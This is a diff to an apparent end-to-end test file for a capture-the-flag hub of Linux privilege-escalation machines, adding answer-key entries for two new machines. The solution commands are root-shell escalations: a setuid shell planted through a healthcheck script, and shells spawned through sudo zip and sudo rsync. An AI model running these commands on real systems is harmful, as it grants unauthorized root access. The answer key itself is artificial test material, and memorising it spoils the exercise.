@@ -71,8 +71,16 @@ const SOLUTIONS = {
     },
     35: {
         flag: 'flag{h34lthcheck_hij4ck}',
-        final: true,
         cmds: ['echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/monitor/healthcheck.sh', 'wait']
+    },
+    36: {
+        flag: 'flag{unz1p_c0mmand_r00t}',
+        cmds: ['sudo zip test.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"']
+    },
+    37: {
+        flag: 'flag{rsync_r3mote_sh3ll_r00t}',
+        final: true,
+        cmds: ['sudo rsync -e "/bin/sh -c /bin/sh" 127.0.0.1:/dev/null /dev/null']
     },
 };
 
@@ -103,11 +111,11 @@ for (const [id, sol] of Object.entries(SOLUTIONS)) {
     });
 }
 
-test('hub renders 35 machines across 3 tiers', async ({ page }) => {
+test('hub renders 37 machines across 3 tiers', async ({ page }) => {
     await page.goto('/');
-    await expect(page.locator('.machine-card')).toHaveCount(35);
+    await expect(page.locator('.machine-card')).toHaveCount(37);
     await expect(page.locator('.home-tier-label')).toHaveCount(3);
-    await expect(page.locator('#homeProgressText')).toHaveText('0 / 35');
+    await expect(page.locator('#homeProgressText')).toHaveText('0 / 37');
 });
 
 test('pipes: cat | wc -l counts passwd lines', async ({ page }) => {
